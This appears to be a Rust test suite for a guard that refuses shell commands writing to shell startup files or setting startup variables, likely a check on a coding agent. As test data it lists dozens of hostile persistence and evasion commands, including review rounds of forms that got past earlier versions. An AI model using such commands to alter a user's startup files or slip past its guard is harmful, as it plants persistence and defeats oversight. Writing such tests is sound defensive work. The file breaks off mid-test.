//! Tests of the shell startup class (TSK-242). Each case runs against a
//! fixture home in a temporary directory; nothing touches the real home.

use super::*;

struct Fixture {
    _dir: tempfile::TempDir,
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        // Resolve the temporary directory's own links (`/var` on macOS),
        // so a spelled path and its resolution agree.
        let root = std::fs::canonicalize(dir.path()).unwrap();
        let home = root.join("home");
        let project = home.join("work/project");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::create_dir_all(home.join(".config/fish")).unwrap();
        std::fs::write(home.join(".zshrc"), "# fixture\n").unwrap();
        std::fs::write(home.join(".bashrc"), "# fixture\n").unwrap();
        Self {
            _dir: dir,
            home,
            project,
        }
    }

    fn env(&self) -> StartupEnv {
        StartupEnv {
            home: Some(self.home.clone()),
            zdotdir: None,
            xdg_config: None,
        }
    }

    /// The command with `H` replaced by the fixture home.
    fn spell(&self, command: &str) -> String {
        command.replace("H/", &format!("{}/", self.home.display()))
    }

    fn judge_in(&self, command: &str, cwd: &Path, env: &StartupEnv) -> Vec<Violation> {
        evaluate(&self.spell(command), cwd, env)
    }

    fn judge(&self, command: &str) -> Vec<Violation> {
        self.judge_in(command, &self.project, &self.env())
    }
}

fn refused(found: &[Violation]) -> bool {
    found.iter().any(|v| v.rule == RULE && v.level_fixed)
}

/// Every visible write form refuses, in every spelling the guard expands.
#[test]
fn visible_writes_to_startup_files_refuse() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo 'ls(){ sudo \"$@\"; }' >> ~/.zshrc",
        "echo x > $HOME/.bashrc",
        "echo x > ${HOME}/.profile",
        "echo x > H/.zshenv",
        "echo x >| ~/.ZSHRC",
        "printf x 1>>~/.bash_aliases",
        "tee -a ~/.bashrc < /dev/null",
        "cp evil.sh ~/.zshrc",
        "cp evil.fish H/.config/fish/config.fish",
        "cp evil.fish ~/.config/fish/conf.d/x.fish",
        "mv evil ~/.zshrc",
        "ln -sf evil ~/.zshrc",
        "install -m 644 evil ~/.zshrc",
        "rsync evil ~/.zshrc",
        "dd if=evil of=~/.zshrc",
        "truncate -s 0 ~/.zshrc",
        "touch ~/.zlogin",
        "sed -i s/a/b/ ~/.zshrc",
        "sed -i.bak 's/a/b/' H/.bashrc",
        "perl -pi -e 's/a/b/' ~/.zshrc",
        "awk 'BEGIN { print \"x\" > \"/home/u/.bashrc\" }'",
        "python3 -c \"open('H/.zshrc','a').write('x')\"",
        "python3 - <<'EOF'\nopen('/home/u/.zshrc', 'a').write('x')\nEOF",
        "node -e \"require('fs').appendFileSync(require('os').homedir() + '/.zshrc', 'x')\"",
        "ruby -e 'File.write(Dir.home + \"/.bashrc\", \"x\")'",
        "curl -sSL -o ~/.zshrc https://example.invalid/x",
        "wget -O ~/.zshrc https://example.invalid/x",
        "less -o ~/.zshrc notes.txt",
        "git config --file ~/.zshrc a.b c",
        "patch ~/.zshrc fix.diff",
        "ed ~/.zshrc < script.ed",
        "vim -c 'normal Gox' -c wq ~/.zshrc",
        "cat > s.sh <<'EOF'\necho x >> ~/.zshrc\nEOF\nsh s.sh",
        "printf 'echo x >> ~/.zshrc' | sh",
        "xargs -I{} cp {} ~/.zshrc < list",
        "find ~ -name .zshrc -exec sed -i s/a/b/ {} +",
        "echo x > ~/.z?hrc",
        "shopt -s dotglob; echo x > ~/*shrc",
        "echo x > ~/.{zsh,bash}rc",
        "echo x > ~/.ssh/rc",
        "echo x > ~/.inputrc",
        "echo x > ~/.tmux.conf",
        "echo x > ~/Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
        "echo x > /etc/profile.d/x.sh",
        "echo x > /etc/zshenv",
        "echo x > .envrc",
        "echo x > sub/dir/.envrc",
        "mkdir -p ~/.config/fish/functions",
        "cp -l ~/.zshrc linked",
        "ln ~/.zshrc linked",
        "bash -c 'echo x >> ~/.zshrc'",
        "env FOO=1 tee -a ~/.bashrc",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(command);
        }
    }
    assert!(wrong.is_empty(), "allowed:\n{}", wrong.join("\n"));
}

/// Reads of startup files, and ordinary writes elsewhere, pass.
#[test]
fn reads_and_ordinary_writes_pass() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "cat ~/.zshrc",
        "grep alias ~/.bashrc",
        "grep -rn alias ~/.config/fish",
        "ls -la ~",
        "head -5 H/.zshrc",
        "diff ~/.zshrc theirs.zshrc",
        "git diff -- .envrc",
        "git log -p -- .envrc",
        "cp ~/.bashrc ./backup",
        "cp H/.zshrc /tmp/zshrc.copy",
        "source ~/.zshrc",
        ". ~/.zshrc",
        "cat ~/.zshrc | grep alias",
        "echo \"add this line to ~/.zshrc yourself\"",
        "echo x > out.txt",
        "cp a.txt b.txt",
        "python3 -c 'print(1)'",
        "HOME=/tmp/fixture-home bash -c true",
        "HOME=/tmp/fixture-home cargo test",
        "cp notes.txt ~/notes.txt",
        "tar -xf bundle.tar -C build",
        "p=build/out; echo x > \"$p\"",
        "echo x > \"$TMPDIR/x\"",
        "rsync -a src/ dest/",
        "find . -name '*.rs'",
        "find ~ -maxdepth 1 -name '.z*'",
        "git status",
        "cargo build --release",
        "mkdir -p ~/.local/state/codeflow",
        "stat ~/.zshrc",
        "echo x > ~/*shrc",
        "rm -rf ~/*",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("{command}: {}", found[0].message));
        }
    }
    // Reads with a program that can also write, and placing calls whose
    // output goes somewhere named, from the home itself (the TSK-242
    // differential over developer commands).
    for command in [
        "sed -n 1,20p ~/.zshrc",
        "sed -n '/alias/p' .bashrc",
        "tar -czf out.tgz build",
        "tar -tf bundle.tar",
        "tar -xzf vendor.tgz -C vendor",
        "unzip pkg.zip -d vendor",
        "wget -O x.json https://example.invalid/x",
        "rsync -a src/ build/src/",
        "git clean -fd",
        "git worktree add ../wt -b x",
    ] {
        let found = f.judge_in(command, &f.home, &f.env());
        if refused(&found) {
            wrong.push(format!("{command} from the home: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "refused:\n{}", wrong.join("\n"));
    for command in [
        "sed -i '' 's/a/b/' .zshrc",
        "sed -n 'w .bashrc' notes",
        "sed -f edit.sed .zshrc",
        "tar -xzf vendor.tgz",
        "tar xf vendor.tar",
        "tar -f vendor.tar",
        "tar -xf vendor.tar -C .config",
        "unzip pkg.zip",
        "wget https://example.invalid/x",
        "curl -O https://example.invalid/x",
        "git worktree add .zsh",
        "git checkout -- .",
    ] {
        let found = f.judge_in(command, &f.home, &f.env());
        assert!(refused(&found), "{command} from the home");
    }
}

/// A target the guard cannot resolve refuses near the class and keeps
/// its verdict elsewhere.
#[test]
fn unresolved_targets_fail_closed_near_the_class() {
    let f = Fixture::new();
    for command in [
        "p=~/.zshrc; echo x > \"$p\"",
        "p=~/.z; echo x > \"${p}shrc\"",
        "echo x > \"$(printf ~/.zshrc)\"",
        "echo x > ~/.$SHELLNAME",
        "echo x > $HOME/.$NAME",
        "echo x > ~root/.zshrc",
        "cp evil \"$TARGET\" # .zshrc",
        "cd \"$d\" && echo x > .zshrc",
        "xargs -I{} sed -i s/a/b/ ~/{} < names",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "echo x > \"$OUT\"",
        "cp a \"$DEST\"",
        "echo x > build/$NAME.log",
        "cd \"$d\" && echo x > notes.txt",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// Placing programs refuse in or into the home, `/etc` or a startup
/// directory, and pass elsewhere.
#[test]
fn placing_into_the_home_refuses() {
    let f = Fixture::new();
    for command in [
        "tar -xf bundle.tar -C ~",
        "tar -xf bundle.tar --directory=H/.config",
        "rsync -a dotfiles/ ~/",
        "cp -r dotfiles/. ~",
        "cp -R fish ~/.config",
        "mv dotconfig ~/.local/share",
        "unzip dots.zip -d ~",
        "git --work-tree=$HOME checkout .",
        "git -C ~ checkout -- .",
        "wget -P ~ https://example.invalid/x",
        "ditto dots ~",
        "stow -t ~ shell",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    let found = f.judge_in("tar -xf bundle.tar", &f.home, &f.env());
    assert!(refused(&found), "tar in the home");
    let found = f.judge_in("git checkout -- .", &f.home, &f.env());
    assert!(refused(&found), "git in the home");
    let found = f.judge_in("git status", &f.home, &f.env());
    assert!(!refused(&found), "a git read in the home");
    // Git judged where it runs: its `-C` directory, and only for a
    // subcommand that can write the working tree.
    let project = f.project.display().to_string();
    for command in [
        "git push origin --tags",
        "git fetch origin",
        "git commit -m x",
        "git add notes.md",
        "git tag v1",
        format!("git -C '{project}' checkout -- .").as_str(),
        format!("git -C {project} pull").as_str(),
    ] {
        let found = f.judge_in(command, &f.home, &f.env());
        assert!(!refused(&found), "{command} from the home: {found:?}");
    }
    for command in [
        "git -C ~ pull",
        "git -C . checkout -- .",
        "git -C $UNSET_DIR checkout -- . && ls ~",
        "git config -f ~/.zshrc a.b c",
    ] {
        let found = f.judge_in(command, &f.home, &f.env());
        assert!(refused(&found), "{command} from the home");
    }
    let found = f.judge(&format!("git -C {} merge main", f.home.display()));
    assert!(refused(&found), "git -C to the home from a project");
    for command in [
        "tar -xf bundle.tar",
        "unzip dots.zip -d vendor",
        "git checkout -- .",
        "curl -sSL https://example.invalid/x",
        "cp -r assets ~/work/project/out",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

/// A startup variable set for a shell that reads startup files refuses.
#[test]
fn startup_environment_for_a_shell_refuses() {
    let f = Fixture::new();
    for command in [
        "ZDOTDIR=/tmp/z zsh -c true",
        "HOME=/tmp/h zsh -c true",
        "env ZDOTDIR=/tmp/z zsh",
        "BASH_ENV=/tmp/e bash -c true",
        "export BASH_ENV=/tmp/e; bash script.sh",
        "PROMPT_COMMAND='id' bash -i",
        "HOME=/tmp/h bash -lc true",
        "ENV=/tmp/e sh -i",
        "XDG_CONFIG_HOME=/tmp/c fish -c true",
        "HOME=/tmp/h tmux new -d",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    for command in [
        "ZDOTDIR=/tmp/z zsh -f -c true",
        "HOME=/tmp/h bash --noprofile --norc -c true",
        "HOME=/tmp/h sh -c true",
        "XDG_CONFIG_HOME=/tmp/c fish --no-config -c true",
        "HOME=/tmp/h pwsh -NoProfile -c 1",
    ] {
        let found = f.judge(command);
        assert!(!refused(&found), "{command}: {found:?}");
    }
}

#[test]
fn direnv_trust_refuses() {
    let f = Fixture::new();
    for command in ["direnv allow", "direnv allow .", "cd sub && direnv permit"] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(!refused(&f.judge("direnv status")));
}

/// A symbolic link to a startup file is judged by where it points, in a
/// plain word, a glob and a native edit; so is a broken link.
#[cfg(unix)]
#[test]
fn symbolic_links_are_followed() {
    let f = Fixture::new();
    let links = f.home.join("links");
    std::fs::create_dir_all(&links).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zshrc"), links.join("a")).unwrap();
    std::os::unix::fs::symlink(f.home.join(".zprofile"), links.join("broken")).unwrap();
    std::os::unix::fs::symlink(&f.home, f.project.join("homelink")).unwrap();
    for command in [
        "echo x >> H/links/a",
        "echo x >> H/links/*",
        "echo x >> H/links/broken",
        "echo x >> homelink/.zshrc",
        "cp evil homelink/.bashrc",
    ] {
        assert!(refused(&f.judge(command)), "{command}");
    }
    assert!(class_target(&links.join("a"), &f.env()).is_some());
    assert!(class_target(&f.project.join("homelink/.zshrc"), &f.env()).is_some());
    assert!(class_target(&f.project.join("notes.md"), &f.env()).is_none());
}

/// `ZDOTDIR` and `XDG_CONFIG_HOME` move the class with them.
#[test]
fn effective_locations_follow_the_environment() {
    let f = Fixture::new();
    let zdot = f.home.join("zdot");
    let xdg = f.home.join("xdg");
    let env = StartupEnv {
        zdotdir: Some(zdot.clone()),
        xdg_config: Some(xdg.clone()),
        ..f.env()
    };
    assert_eq!(
        class_target(&zdot.join(".zshrc"), &env).as_deref(),
        Some("$ZDOTDIR/.zshrc")
    );
    assert!(class_target(&zdot.join(".zshenv.zwc"), &env).is_some());
    assert!(class_target(&xdg.join("fish/config.fish"), &env).is_some());
    assert!(class_target(&f.home.join(".zshrc"), &env).is_some());
    assert!(class_target(&zdot.join("notes"), &env).is_none());
    let cmd = format!("echo x >> {}/.zshrc", zdot.display());
    assert!(refused(&evaluate(&cmd, &f.project, &env)));
}

/// Every table entry is in the class as a native edit target, in the
/// spelling the table gives and in another letter case.
#[test]
fn every_table_entry_is_a_class_target() {
    let f = Fixture::new();
    let table = &actions::table().startup_paths;
    for entry in &table.home {
        let path = f.home.join(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.env()).is_some(), "{entry}");
        let upper = f.home.join(entry.trim_end_matches('/').to_uppercase());
        assert!(class_target(&upper, &f.env()).is_some(), "{entry} upper");
        if entry.ends_with('/') {
            assert!(
                class_target(&path.join("x"), &f.env()).is_some(),
                "{entry}x"
            );
        }
    }
    for entry in &table.absolute {
        let path = PathBuf::from(entry.trim_end_matches('/'));
        assert!(class_target(&path, &f.env()).is_some(), "{entry}");
    }
    for name in &table.anywhere {
        assert!(
            class_target(&f.project.join(name), &f.env()).is_some(),
            "{name}"
        );
    }
    assert!(class_target(&f.home.join(".zshrc.d.notes"), &f.env()).is_none());
    assert!(class_target(&f.home.join(".config/other"), &f.env()).is_none());
}

/// The text floor finds a startup file as a path or a name, and not
/// inside a longer name.
#[test]
fn the_text_floor_reads_names_not_substrings() {
    let f = Fixture::new();
    let class = Class::new(&f.env());
    for text in [
        "open('/home/u/.zshrc')",
        "\".bashrc\"",
        "C:\\Users\\u\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1",
        "~/.config/fish/config.fish",
        "/etc/profile.d/x",
    ] {
        assert!(class.named_in(text).is_some(), "{text}");
    }
    for text in ["user.profile", "my_zshrc", "x.bashrc_backup", "profiles"] {
        assert!(class.named_in(text).is_none(), "{text}");
    }
}

/// The forms the first holistic review found passing (TSK-242, round one):
/// a reassigned or argument-shadowed variable, a relative run-time name in
/// the home, an attached option value, a copy landing on a link, a `+f`
/// that turns zsh's startup files back on, and a recursive glob. Each
/// passed at 3a8065d76.
#[test]
fn review_round_one_forms_refuse() {
    let f = Fixture::new();
    let out = f.project.join("out");
    std::fs::create_dir_all(&out).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(f.home.join(".zshrc"), out.join("payload")).unwrap();
    let mut wrong = Vec::new();
    let mut refuse = vec![
        "p=~/.zshrc; echo x > \"$p\"; p=notes",
        "p=~/.zshrc; echo p=notes; echo x > \"$p\"",
        // `cd H/`: run_dirs reads `~` from the process, not the fixture.
        "cd H/; echo x > \"$DEST\"",
        "curl -s -o$HOME/.zshrc https://example.invalid/x",
        "curl -so~/.bashrc https://example.invalid/x",
        "ZDOTDIR=/tmp/z zsh +f -c true",
        "ZDOTDIR=/tmp/z zsh -f +f -c true",
        "ZDOTDIR=/tmp/z zsh -f -o rcs -c true",
        "ZDOTDIR=/tmp/z zsh +o norcs -c true",
        // Any `-o` leaves the startup files on (round two).
        "ZDOTDIR=/tmp/z zsh -o norcs -c true",
        "echo x > ~/**/.zshrc",
        "rg --pre ./x alias ~/.zshrc",
    ];
    if cfg!(unix) {
        refuse.push("cp payload out/");
    }
    for command in refuse {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    if !refused(&f.judge_in("echo x > \"$DEST\"", &f.home, &f.env())) {
        wrong.push("allowed from the home: echo x > \"$DEST\"".to_string());
    }
    for command in [
        "p=notes; echo x > \"$p\"",
        "echo x > \"$DEST\"",
        "ZDOTDIR=/tmp/z zsh -fc true",
        "rg --no-config alias ~/.zshrc",
        "rm -rf build/**/tmp",
        "cp notes.txt out/",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// The forms the second holistic review found passing at 6ce696b69: a use
/// before a later assignment, `cp -f` read as taking a value, a link made
/// earlier in the same call, attached `-o` and `+f` after `-s` in zsh, a
/// recursive glob reaching a link, and ripgrep reading a configuration.
#[test]
fn review_round_two_forms_refuse() {
    let f = Fixture::new();
    let out = f.project.join("out");
    let links = f.project.join("links");
    std::fs::create_dir_all(&out).unwrap();
    std::fs::create_dir_all(&links).unwrap();
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(f.home.join(".zshrc"), out.join("payload")).unwrap();
        std::os::unix::fs::symlink(f.home.join(".zshrc"), links.join("one")).unwrap();
    }
    let mut wrong = Vec::new();
    let mut refuse = vec![
        "ln -s ~/.zshrc rc; echo x >> rc",
        "ln -sf H/.bashrc rc",
        "ZDOTDIR=/tmp/z zsh -f -orcs -c true",
        "ZDOTDIR=/tmp/z zsh -f -s +f",
        "ZDOTDIR=/tmp/z zsh -f --rcs -c true",
        "ZDOTDIR=/tmp/z zsh -f +x -c true",
        "rg marker ~/.zshrc",
        "RIPGREP_CONFIG_PATH=rgconfig rg marker ~/.zshrc",
    ];
    if cfg!(unix) {
        refuse.extend(["cp -f payload out/", "echo x >> links/**"]);
    }
    for command in refuse {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    if !refused(&f.judge_in("echo x > \"$p\"; p=notes", &f.home, &f.env())) {
        wrong.push("allowed from the home: echo x > \"$p\"; p=notes".to_string());
    }
    for command in [
        "echo x > \"$p\"; p=notes",
        "cp -f notes.txt out/",
        "ln -s ../shared shared",
        "rm -rf build/**/tmp",
        "ZDOTDIR=/tmp/z zsh -f -c true",
        "rg --no-config marker ~/.zshrc",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Review round three: an attached target directory, GNU sed's `e`,
/// and a relative `ZDOTDIR`. Landing-relative link text is a residual.
#[test]
fn review_round_three_forms_refuse() {
    let f = Fixture::new();
    std::fs::create_dir_all(f.project.join("out")).unwrap();
    std::fs::create_dir_all(f.project.join("fixtures")).unwrap();
    let mut wrong = Vec::new();
    for command in [
        "cp -tH/ fixtures/.zshrc",
        "cp -ftH/ fixtures/.zshrc",
        "mv -tH/ fixtures/.bashrc",
        "sed -n '1e echo x >> sub/.envrc' notes",
        "sed -n 's/a/b/e' ~/.zshrc",
        "sed -n -e 1p -e 'w /tmp/x' ~/.zshrc",
        "sed -n '1p;y/a/b/' ~/.zshrc",
        "sed -f script ~/.zshrc",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "cp -t out notes.txt",
        "cp -tH/work notes.txt",
        "ln -s ../shared out/shared",
        "sed -n '/alias/p' ~/.zshrc",
        "sed 's/a/b/g' ~/.zshrc",
        "sed -n -e 1p -e '$p' ~/.zshrc",
        "sed -ne '1,20p;$=' ~/.zshrc",
        "sed -E -n '/^alias/p' ~/.bashrc",
    ] {
        let found = f.judge(command);
        if refused(&found) {
            wrong.push(format!("refused: {command}: {}", found[0].message));
        }
    }
    // A relative `ZDOTDIR` protects the zsh file names in every directory.
    let env = StartupEnv {
        zdotdir: Some(PathBuf::from("zdir")),
        ..f.env()
    };
    if !refused(&f.judge_in("echo x > zdir/.zshenv", &f.project, &env)) {
        wrong.push("allowed with ZDOTDIR=zdir: echo x > zdir/.zshenv".to_string());
    }
    if class_target(&f.project.join("zdir/.zshrc"), &env).is_none() {
        wrong.push("not a class target with ZDOTDIR=zdir: zdir/.zshrc".to_string());
    }
    if refused(&f.judge_in("echo x > zdir/notes", &f.project, &env)) {
        wrong.push("refused with ZDOTDIR=zdir: echo x > zdir/notes".to_string());
    }
    assert!(wrong.is_empty(), "wrong verdicts:\n{}", wrong.join("\n"));
}

/// Named link sources and destinations remain in the class. Copier
/// preservation, dereference order and landing-relative text are residuals.
#[test]
fn named_copy_and_link_paths() {
    let f = Fixture::new();
    std::fs::create_dir_all(f.project.join("out")).unwrap();
    for command in [
        "cp -s ~/.zshrc envlink; echo copied >> envlink",
        "cp -s sub/.envrc envlink",
        "cp --symbolic-link ~/.zshrc rc",
        "cp -as ~/.zshrc rc",
        "cp -l ~/.bashrc rc",
        "cp --link ~/.bashrc rc",
        "ln -s ~/.zshrc rc",
        "ln ~/.bashrc rc",
        "mv ~/.bashrc rc",
        "cp --target-directory=$HOME fixtures/.zshrc",
        "cp --target-directory H/ fixtures/.zshrc",
        "mv --target-directory H/ fixtures/.bashrc",
        "cp -s notes.txt ~/.zshrc",
        "ln notes.txt ~/.bashrc",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
    for command in [
        "cp ~/.zshrc backup",
        "cp -a ~/.bashrc backup",
        "cp -s notes.txt out/note-link",
        "install -m 644 notes.txt out/",
        "cp --preserve=mode notes.txt out/",
        "cp --remove-destination notes.txt out/",
        "cp -r dir ~/",
        "cp --target-directory=H/ notes.txt",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
}

/// A startup file backed by a dotfile-manager link can still be backed up.
#[cfg(unix)]
#[test]
fn copying_a_named_startup_link_only_reads_it() {
    let f = Fixture::new();
    let backing = f.project.join("zshrc");
    std::fs::write(&backing, "# fixture\n").unwrap();
    std::fs::remove_file(f.home.join(".zshrc")).unwrap();
    std::os::unix::fs::symlink(&backing, f.home.join(".zshrc")).unwrap();
    for command in [
        "cp ~/.zshrc backup",
        "cp -a ~/.zshrc backup",
        "cp -P ~/.zshrc backup",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
    for command in [
        "ln -s ~/.zshrc rc",
        "cp -s ~/.zshrc rc",
        "cp -l ~/.zshrc rc",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
}

/// Declarations write no file, but their redirects and startup variables
/// still receive the ordinary checks.
#[test]
fn declarations_keep_their_write_checks() {
    let f = Fixture::new();
    for command in [
        "export X=notes > ~/.zshrc",
        "export BASH_ENV=notes; bash -c true",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
    for command in [
        "export PATH=$PATH:./bin",
        "export PATH=\"$HOME/bin:$PATH\"",
        "readonly CACHE=\"$CACHE\"",
        "declare -x EDITOR=vim",
    ] {
        assert!(
            !refused(&f.judge_in(command, &f.home, &f.env())),
            "refused: {command}"
        );
    }
}

/// Review of e4536456b: a literal the line assigns reads as its value in
/// every body the guard reads as code, not only in redirects and path words.
const ASSIGNED_BODIES: &[&str] = &[
    "p=~/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=src/.envrc; perl -e \"open(F,'>>$p')\"",
    "p=src/.envrc; ruby -e \"File.write('$p','x')\"",
    "p=src/.envrc; awk \"BEGIN{print 1 > \\\"$p\\\"}\"",
    "p=src/.envrc; sh -c \"echo x >> $p\"",
    "p=src/.envrc; bash -c \"echo x >> $p\"",
    "p=src/.envrc; zsh -c \"echo x >> $p\"",
    "p=src/.envrc; eval \"echo x >> $p\"",
    "p=src/.envrc; echo x | xargs sh -c \"echo x >> $p\"",
    "p=src/.envrc; find . -maxdepth 0 -exec sh -c \"echo x >> $p\" \\;",
    "p=src/.envrc; parallel \"echo x >> $p\" ::: a",
    "d=src; f=.envrc; python3 -c \"open('$d/$f','a')\"",
    "d=~; f=.zshrc; python3 -c \"open('${d}/${f}','a')\"",
    "export p=src/.envrc; python3 -c \"open('$p','a')\"",
    "p=src/.envrc python3 -c \"open('$p','a')\"",
];

/// An unreadable expansion in a body, on a line that names a class file,
/// refuses as the redirect path does.
const UNRESOLVED_BODIES: &[&str] = &[
    "cat ~/.zshrc; python3 -c \"open('$NAME','a').write('x')\"",
    "p=$HOME/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=$(echo ~/.zshrc); python3 -c \"open('$p','a').write('x')\"",
    "cat ~/.zshrc; node -e \"require('fs').appendFileSync(`$DEST`,'x')\"",
    "cat ~/.zshrc; sh -c \"echo x >> $(pwd)/f\"",
];

const BODY_CONTROLS: &[&str] = &[
    "python3 -c 'print(1)'",
    "p=notes.txt; python3 -c \"open('$p','a').write('x')\"",
    "p=notes.txt; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=notes.txt; sh -c \"echo x >> $p\"",
    "cat ~/.zshrc; python3 -c 'print(1)'",
    "grep alias ~/.zshrc | awk '{print $2}'",
    "grep alias ~/.zshrc; perl -ne 'print $_' notes.txt",
    "python3 -c \"open('$NAME','a').write('x')\"",
    // The program reads the path at run time: the stated residual.
    "export p=~/.zshrc; python3 -c 'import os; open(os.environ[\"p\"],\"a\").write(\"x\")'",
];

#[test]
fn assigned_literals_read_as_values_in_every_body() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in ASSIGNED_BODIES.iter().chain(UNRESOLVED_BODIES) {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in BODY_CONTROLS {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// A variable the line assigns a plain path keeps the verdict the path has
/// when written out (AC-7): `/scratch` is not a directory above a class
/// entry, while a placement into the home or `/etc` still refuses.
#[test]
fn assigned_plain_paths_keep_the_verdict_of_the_literal() {
    let f = Fixture::new();
    for command in [
        "R=/scratch; git -C \"$R\" commit -m x",
        "R=/scratch git -C \"$R\" commit -m x",
        "export R=/scratch\ngit -C \"${R}\" commit -m x",
        "p=notes.txt; echo x > \"$p\"",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
    for command in [
        "R=~; tar -xf a.tar -C \"$R\"",
        "R=/etc; tar -xf a.tar -C \"$R\"",
        "p=~/.zshrc; echo x > \"$p\"",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
}

/// Grok round two, finding 1: a process substitution hands text to a runner
/// as a pipe does, so a line that names a class file and runs one refuses.
#[test]
fn process_substitution_text_run_by_a_runner_refuses() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "bash <(echo 'echo x >> ~/.zshrc')",
        "bash <(echo 'echo x >> src/.envrc')",
        "sh <(printf 'echo x >> %s\\n' src/.envrc)",
        "python3 <(echo 'open(\"src/.envrc\",\"a\").write(\"x\")')",
        "source <(echo 'echo x >> src/.envrc')",
        ". <(echo 'echo x >> src/.envrc')",
        "zsh <(echo 'echo x >> src/.envrc')",
        "eval <(echo 'echo x >> src/.envrc')",
        "exec bash <(echo 'echo x >> src/.envrc')",
        "bash --rcfile <(echo 'echo x >> src/.envrc') -i",
        "env bash <(echo 'echo x >> src/.envrc')",
        "node <(echo 'x') <(echo '.envrc')",
        "awk -f <(echo 'BEGIN{print 1 > \".envrc\"}')",
        "sed -f <(echo 'w .envrc') notes.txt",
        "make -f <(echo 'all: ; echo x >> .envrc')",
        "bash >(cat) <(echo 'echo x >> src/.envrc')",
        "echo x > >(tee -a ~/.zshrc)",
        "bash -c \"$(echo 'echo x >> src/.envrc')\"",
        "printf 'echo x >> ~/.zshrc' | sh",
        // The same shape in other spellings (sibling sweep): a script written
        // and run in one call, a script from a substitution, a heredoc script.
        "echo 'echo x >> src/.envrc' > r.sh; bash r.sh",
        "printf 'echo x >> src/.envrc' > /tmp/s.sh && sh /tmp/s.sh",
        "echo 'echo x >> src/.envrc' > r.sh; bash < r.sh",
        "eval \"$(echo 'echo x >> src/.envrc')\"",
        "eval $(echo 'echo x >> src/.envrc')",
        "bash -c `echo 'echo x >> src/.envrc'`",
        "awk -f - <<'EOF'\nBEGIN{print 1 > \"src/.envrc\"}\nEOF",
        "patch -p0 < <(echo '--- a/.envrc')",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "cat > notes.md <<'EOF'\nmention .zshrc\nEOF",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "sed 's/a/b/' <<< 'plain'",
        "awk '{print $1}' <<< 'plain text'",
        "echo ok > /dev/null; bash build.sh",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "cat <(echo hello)",
        "diff <(echo a) <(echo b)",
        "bash <(echo 'echo hi')",
        "grep alias <(cat ~/.zshrc)",
        "diff <(cat ~/.zshrc) <(cat ~/.bashrc)",
        "comm -12 <(sort notes.txt) <(sort other.txt)",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round two, finding 2: only `~user/rest` is a home the guard cannot
/// read. The directory stack (`~+`, `~-`, `~N`, `~+N`, `~-N`) and a tilde
/// word without a slash are not.
#[test]
fn only_a_user_home_path_is_an_unreadable_home() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo a 2> ~err.log",
        "cd ~+1 && rm x",
        "cd ~- && rm x",
        "cd ~-1 && rm x",
        "cd ~1 && rm x",
        "pushd ~2 && rm x",
        "cd ~1; cat policy.json",
        "rm ~-/policy.json",
        "pushd -n review-stack; cd build; cd ~1; cat policy.json",
        "printf x | xargs rm ~+1",
        "pushd -n review-stack; cd build; cd ~1; printf '%s\\n' policy.json | xargs rm",
        "cd ~+1; printf '%s\\n' policy.json | xargs rm",
        "R=/scratch; git -C \"$R\" commit -m x",
    ] {
